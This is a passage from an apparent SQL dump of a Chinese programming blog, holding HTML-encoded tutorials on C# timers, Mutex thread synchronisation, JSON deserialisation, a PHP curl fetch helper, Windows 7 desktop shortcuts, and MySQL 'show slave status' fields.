/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; s.tmr = timer;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //主线程停下来等待Timer对象的终止<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(s.tmr != null)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Thread.Sleep(0);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;Timer example done.&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.ReadLine();<br />\r\n&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; //下面是被定时调用的方法<br />\r\n&nbsp;&nbsp;&nbsp; static void CheckStatus(Object state)<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TimerExampleState s =(TimerExampleState)state;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; s.counter++;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;{0} Checking Status {1}.&quot;,DateTime.Now.TimeOfDay, s.counter);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(s.counter == 5)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //使用Change方法改变了时间间隔<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (s.tmr).Change(10000,2000);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;changed&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(s.counter == 10)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;disposing of timer&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; s.tmr.Dispose();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; s.tmr = null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n}</p>\r\n\r\n<p>程序首先创建了一个定时器，它将在创建1秒之后开始每隔1秒调用一次CheckStatus()方法，当调用5次以后，在CheckStatus()方 法中修改了时间间隔为2秒，并且指定在10秒后重新开始。当计数达到10次，调用Timer.Dispose()方法删除了timer对象，主线程于是跳 出循环，终止程序。</p>\r\n',0,1438007827,0,0),(89,38,'C#多线程学习(六) 互斥对象','<p>如何控制好多个线程相互之间的联系，不产生冲突和重复，这需要用到互斥对象，即：System.Threading 命名空间中的 Mutex 类。<br />\r\n我们可以把Mutex看作一个出租车，乘客看作线程。乘客首先等车，然后上车，最后下车。当一个乘客在车上时，其他乘客就只有等他下车以后才可以上车。而线程与Mutex对象的关系也正是如此，线程使用Mutex.WaitOne()方法等待Mutex对象被释放，如果它等待的Mutex对象被释放了，它就自动拥有这个对象，直到它调用Mutex.ReleaseMutex()方法释放这个对象，而在此期间，其他想要获取这个Mutex对象的线程都只有等待。<br />\r\n下面这个例子使用了Mutex对象来同步四个线程，主线程等待四个线程的结束，而这四个线程的运行又是与两个Mutex对象相关联的。<br />\r\n其中还用到AutoResetEvent类的对象，可以把它理解为一个信号灯。这里用它的有信号状态来表示一个线程的结束。<br />\r\n// AutoResetEvent.Set()方法设置它为有信号状态<br />\r\n// AutoResetEvent.Reset()方法设置它为无信号状态</p>\r\n\r\n<p>Mutex 类的程序示例：<br />\r\nusing System;<br />\r\nusing System.Threading;</p>\r\n\r\n<p>namespace ThreadExample<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; public class MutexSample<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp; static Mutex gM1;<br />\r\n&nbsp;&nbsp;&nbsp; static Mutex gM2;<br />\r\n&nbsp;&nbsp;&nbsp; const int ITERS = 100;<br />\r\n&nbsp;&nbsp;&nbsp; static AutoResetEvent Event1 = new AutoResetEvent(false);<br />\r\n&nbsp;&nbsp;&nbsp; static AutoResetEvent Event2 = new AutoResetEvent(false);<br />\r\n&nbsp;&nbsp;&nbsp; static AutoResetEvent Event3 = new AutoResetEvent(false);<br />\r\n&nbsp;&nbsp;&nbsp; static AutoResetEvent Event4 = new AutoResetEvent(false);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; public static void Main(String[] args)<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;Mutex Sample &quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //创建一个Mutex对象，并且命名为MyMutex<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gM1 = new Mutex(true,&quot;MyMutex&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //创建一个未命名的Mutex 对象.<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gM2 = new Mutex(true);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot; - Main Owns gM1 and gM2&quot;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; AutoResetEvent[] evs = new AutoResetEvent[4];<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; evs[0] = Event1; //为后面的线程t1,t2,t3,t4定义AutoResetEvent对象<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; evs[1] = Event2;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; evs[2] = Event3;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; evs[3] = Event4;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MutexSample tm = new MutexSample( );<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Thread t1 = new Thread(new ThreadStart(tm.t1Start));<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Thread t2 = new Thread(new ThreadStart(tm.t2Start));<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Thread t3 = new Thread(new ThreadStart(tm.t3Start));<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Thread t4 = new Thread(new ThreadStart(tm.t4Start));<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; t1.Start( );// 使用Mutex.WaitAll()方法等待一个Mutex数组中的对象全部被释放<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; t2.Start( );// 使用Mutex.WaitOne()方法等待gM1的释放<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; t3.Start( );// 使用Mutex.WaitAny()方法等待一个Mutex数组中任意一个对象被释放<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; t4.Start( );// 使用Mutex.WaitOne()方法等待gM2的释放</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Thread.Sleep(2000);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot; - Main releases gM1&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gM1.ReleaseMutex( ); //线程t2,t3结束条件满足</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Thread.Sleep(1000);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot; - Main releases gM2&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gM2.ReleaseMutex( ); //线程t1,t4结束条件满足</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //等待所有四个线程结束<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WaitHandle.WaitAll(evs);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot; Mutex Sample&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.ReadLine();<br />\r\n&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; public void t1Start( )<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;t1Start started, Mutex.WaitAll(Mutex[])&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Mutex[] gMs = new Mutex[2];<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gMs[0] = gM1;//创建一个Mutex数组作为Mutex.WaitAll()方法的参数<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gMs[1] = gM2;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Mutex.WaitAll(gMs);//等待gM1和gM2都被释放<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Thread.Sleep(2000);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;t1Start finished, Mutex.WaitAll(Mutex[]) satisfied&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Event1.Set( ); //线程结束，将Event1设置为有信号状态<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp; public void t2Start( )<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;t2Start started, gM1.WaitOne( )&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gM1.WaitOne( );//等待gM1的释放<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;t2Start finished, gM1.WaitOne( ) satisfied&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Event2.Set( );//线程结束，将Event2设置为有信号状态<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp; public void t3Start( )<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;t3Start started, Mutex.WaitAny(Mutex[])&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Mutex[] gMs = new Mutex[2];<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gMs[0] = gM1;//创建一个Mutex数组作为Mutex.WaitAny()方法的参数<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gMs[1] = gM2;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Mutex.WaitAny(gMs);//等待数组中任意一个Mutex对象被释放<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;t3Start finished, Mutex.WaitAny(Mutex[])&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Event3.Set( );//线程结束，将Event3设置为有信号状态<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp; public void t4Start( )<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;t4Start started, gM2.WaitOne( )&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gM2.WaitOne( );//等待gM2被释放<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;t4Start finished, gM2.WaitOne( )&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Event4.Set( );//线程结束，将Event4设置为有信号状态<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n}</p>\r\n\r\n<p>程序的输出结果：<br />\r\nMutex Sample<br />\r\n&nbsp;- Main Owns gM1 and gM2<br />\r\nt1Start started, Mutex.WaitAll(Mutex[])<br />\r\nt2Start started, gM1.WaitOne( )<br />\r\nt3Start started, Mutex.WaitAny(Mutex[])<br />\r\nt4Start started, gM2.WaitOne( )<br />\r\n&nbsp;- Main releases gM1<br />\r\nt2Start finished, gM1.WaitOne( ) satisfied<br />\r\nt3Start finished, Mutex.WaitAny(Mutex[])<br />\r\n&nbsp;- Main releases gM2<br />\r\nt1Start finished, Mutex.WaitAll(Mutex[]) satisfied<br />\r\nt4Start finished, gM2.WaitOne( )<br />\r\n&nbsp;Mutex Sample</p>\r\n\r\n<p>从执行结果可以很清楚地看到，线程t2,t3的运行是以gM1的释放为条件的，而t4在gM2释放后开始执行，t1则在gM1和gM2都被释放了之后才执行。Main()函数最后，使用WaitHandle等待所有的AutoResetEvent对象的信号，这些对象的信号代表相应线程的结束。</p>\r\n',0,1438007877,0,0),(90,38,'C#将Json字符串反序列化成List对象类集合','<p>using System.IO;</p>\r\n\r\n<p>using System.Web.Script.Serialization;</p>\r\n\r\n<p>using System.Runtime.Serialization.Json;</p>\r\n\r\n<p>publicstaticList&lt;T&gt; JSONStringToList&lt;T&gt;(thisstring JsonStr)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; JavaScriptSerializer Serializer = newJavaScriptSerializer();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; List&lt;T&gt; objs = Serializer.Deserialize&lt;List&lt;T&gt;&gt;(JsonStr);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return objs;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; publicstatic T Deserialize&lt;T&gt;(string json)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; T obj = Activator.CreateInstance&lt;T&gt;();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; using (MemoryStream ms = newMemoryStream(Encoding.UTF8.GetBytes(json)))</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataContractJsonSerializer serializer = newDataContractJsonSerializer(obj.GetType());</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return (T)serializer.ReadObject(ms);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>}</p>\r\n\r\n<p>好了，我们来测试下</p>\r\n\r\n<p>string JsonStr = &quot;[{Name:&#39;苹果&#39;,Price:5.5},{Name:&#39;橘子&#39;,Price:2.5},{Name:&#39;柿子&#39;,Price:16}]&quot;;</p>\r\n\r\n<p>List&lt;Product&gt; products = newList&lt;Product&gt;();</p>\r\n\r\n<p>products = JSONStringToList&lt;Product&gt;(JsonStr);</p>\r\n\r\n<p>//Response.Write(products.Count());</p>\r\n\r\n<p>foreach (var item in products)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>Response.Write(item.Name + &quot;:&quot; + item.Price + &quot;&lt;br /&gt;&quot;);</p>\r\n\r\n<p>}</p>\r\n\r\n<p>publicclassProduct</p>\r\n\r\n<p>{</p>\r\n\r\n<p>publicstring Name { get; set; }</p>\r\n\r\n<p>publicdouble Price { get; set; }</p>\r\n\r\n<p>}</p>\r\n\r\n<p>结果：</p>\r\n\r\n<p>苹果:5.5<br />\r\n橘子:2.5<br />\r\n柿子:16</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>序列化就更简单了，请参看：</p>\r\n\r\n<p>C#将对象序列化成JSON字符串</p>\r\n\r\n<p>http://www.rczjp.cn/HTML/101201/20104701014751.html</p>\r\n',0,1438007958,0,0),(91,10,'比file_get_contents稳定的curl_get_contents分享','<p>分享一个实际在用的函数：</p>\r\n\r\n<p>复制代码 代码如下:</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>/*比file_get_contents稳定的多！$timeout为超时时间，单位是秒，默认为1s。*/</p>\r\n\r\n<p>function curl_get_contents($url,$timeout=1) {</p>\r\n\r\n<p>$curlHandle = curl_init();</p>\r\n\r\n<p>curl_setopt( $curlHandle , CURLOPT_URL, $url );</p>\r\n\r\n<p>curl_setopt( $curlHandle , CURLOPT_RETURNTRANSFER, 1 );</p>\r\n\r\n<p>curl_setopt( $curlHandle , CURLOPT_TIMEOUT, $timeout );</p>\r\n\r\n<p>$result = curl_exec( $curlHandle );</p>\r\n\r\n<p>curl_close( $curlHandle );</p>\r\n\r\n<p>return $result;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>$hx = curl_get_contents(&#39;http://www.jb51.net&#39;);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>相信使用过file_get_contents函数的朋友都知道，当获取的$url访问不了时，会导致页面漫长的等待，甚至还能导致PHP进程占用CPU达100%，因此这个函数就诞生了。curl的一些常识介绍</p>\r\n\r\n<p>保留原file_get_contents函数的原因是当读取本地文件时，用原生的file_get_contents显然更合适。</p>\r\n\r\n<p>另来自张宴的file_get_contnets的优化，具体可看：http://www.jb51.net/article/28030.htm</p>\r\n\r\n<p>同样是设置超时时间来解决这个问题。如果没装curl，就必须得用这个方式了。</p>\r\n\r\n<p>复制代码 代码如下:</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>$ctx = stream_context_create(array(</p>\r\n\r\n<p>&#39;http&#39; =&gt; array(</p>\r\n\r\n<p>&#39;timeout&#39; =&gt; 1 //设置一个超时时间，单位为秒</p>\r\n\r\n<p>)</p>\r\n\r\n<p>)</p>\r\n\r\n<p>);</p>\r\n\r\n<p>file_get_contents(&quot;http://www.jb51.net/&quot;, 0, $ctx);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>另外，据不完全测试，使用curl获取页面比用file_get_contents稳定的多。</p>\r\n',0,1438008039,0,0),(92,28,'Windows7下4种方式快速显示桌面，你用哪个？','<p>来看看Win7下显示桌面的方法集合~</p>\r\n\r\n<p>1、Windows键+D快捷键直接显示桌面；</p>\r\n\r\n<p>2、鼠标移到任务栏右下角直接显示桌面；</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150727224247833392.jpg\" style=\"height:267px; width:570px\" /></p>\r\n\r\n<p>3、Windows键+空格快捷键显示桌面；</p>\r\n\r\n<p>4、任务栏鼠标右键，选择&ldquo;显示桌面&rdquo;。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150727224313337222.jpg\" style=\"height:267px; width:570px\" /></p>\r\n\r\n<p>你最常用的是哪一个呢？</p>\r\n\r\n<p>小编习惯第2个，你呢？</p>\r\n\r\n<p>大家都来说说看吧！</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150727224351524346.jpg\" style=\"height:468px; width:580px\" /></p>\r\n',0,1438008251,0,0),(93,32,'show slave status 解释','<p>MySQL同步功能由3个线程(master上1个，slave上2个)来实现。执行 DE&gt;START SLAVEDE&gt; 语句后，slave就创建一个I/O线程。I/O线程连接到master上，并请求master发送二进制日志中的语句。master创建一个线程来把日志的内容发送到slave上。这个线程在master上执行 DE&gt;SHOW PROCESSLISTDE&gt; 语句后的结果中的 DE&gt;Binlog DumpDE&gt; 线程便是。slave上的I/O线程读取master的 DE&gt;Binlog DumpDE&gt; 线程发送的语句，并且把它们拷贝到其数据目录下的中继日志(relay logs)中。第三个是SQL线程，salve用它来读取中继日志，然后执行它们来更新数据。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>如上所述，每个master/slave上都有3个线程。每个master上有多个线程，它为每个slave连接都创建一个线程，每个slave只有I/O和SQL线程。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>show slave master 用于提供有关从属服务器线程的关键参数的信息</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql&gt; show slave status \\G;</p>\r\n\r\n<p>*************************** 1. row ***************************</p>\r\n\r\n<p>Slave_IO_State: Waiting for master to send event</p>\r\n\r\n<p>Master_Host: 172.17.2.40</p>\r\n\r\n<p>Master_User: photorepl</p>\r\n\r\n<p>Master_Port: 4331</p>\r\n\r\n<p>Connect_Retry: 60</p>\r\n\r\n<p>Master_Log_File: mysql-bin.005502</p>\r\n\r\n<p>Read_Master_Log_Pos: 64401238</p>\r\n\r\n<p>Relay_Log_File: mysqld-relay-bin.015418</p>\r\n\r\n<p>Relay_Log_Pos: 13456757</p>\r\n\r\n<p>Relay_Master_Log_File: mysql-bin.005152</p>\r\n\r\n<p>Slave_IO_Running: Yes</p>\r\n\r\n<p>Slave_SQL_Running: Yes</p>\r\n\r\n<p>Replicate_Do_DB:</p>\r\n\r\n<p>Replicate_Ignore_DB: mysql</p>\r\n\r\n<p>Replicate_Do_Table:</p>\r\n\r\n<p>Replicate_Ignore_Table:</p>\r\n\r\n<p>Replicate_Wild_Do_Table: photo.%</p>\r\n\r\n<p>Replicate_Wild_Ignore_Table: mysql.%</p>\r\n\r\n<p>Last_Errno: 0</p>\r\n\r\n<p>Last_Error:</p>\r\n\r\n<p>Skip_Counter: 0</p>\r\n\r\n<p>Exec_Master_Log_Pos: 13456620</p>\r\n\r\n<p>Relay_Log_Space: 36764898503</p>\r\n\r\n<p>Until_Condition: None</p>\r\n\r\n<p>Until_Log_File:</p>\r\n\r\n<p>Until_Log_Pos: 0</p>\r\n\r\n<p>Master_SSL_Allowed: No</p>\r\n\r\n<p>Master_SSL_CA_File:</p>\r\n\r\n<p>Master_SSL_CA_Path:</p>\r\n\r\n<p>Master_SSL_Cert:</p>\r\n\r\n<p>Master_SSL_Cipher:</p>\r\n\r\n<p>Master_SSL_Key:</p>\r\n\r\n<p>Seconds_Behind_Master: 249904</p>\r\n\r\n<p>&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;&times;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>SHOW SLAVE STATUS会返回以下字段：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? Slave_IO_State</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>SHOW PROCESSLIST输出的State字段的拷贝。SHOW PROCESSLIST用于从属I/O线程。如果线程正在试图连接到主服务器，正在等待来自主服务器的时间或正在连接到主服务器等，本语句会通知您</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? Master_User</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>被用于连接主服务器的当前用户。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? Master_Port</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>当前的主服务器接口。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? Connect_Retry</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&ndash;master-connect-retry选项的当前值</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>? 